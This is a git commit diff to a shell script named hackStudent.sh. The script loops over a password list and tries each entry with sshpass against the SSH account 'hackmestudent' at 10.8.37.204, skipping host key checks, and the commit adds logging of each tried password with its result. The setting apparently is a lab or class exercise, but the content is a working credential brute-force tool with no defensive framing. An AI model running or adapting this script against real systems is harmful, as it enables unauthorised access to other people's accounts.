a03464de110754b7ce7939e46f033c70fd084566
Raymond Lin <86033049+ZaRamen@users.noreply.github.com>
2022-12-08 00:12:54 -0500

    Update hackStudent.sh

--- hackStudent.sh
+++ hackStudent.sh
@@ -1,5 +1,6 @@
 #!/bin/sh
 
+touch results
 for line in $(cat $1)
 do
    sshpass -p $line ssh -o StrictHostKeyChecking=no hackmestudent@10.8.37.204 exit
@@ -10,4 +11,5 @@ do
     result=$?
    done
    tail -n +2 $1 > $1.tmp && mv $1.tmp $1
+   echo $line, $result >> results
 done
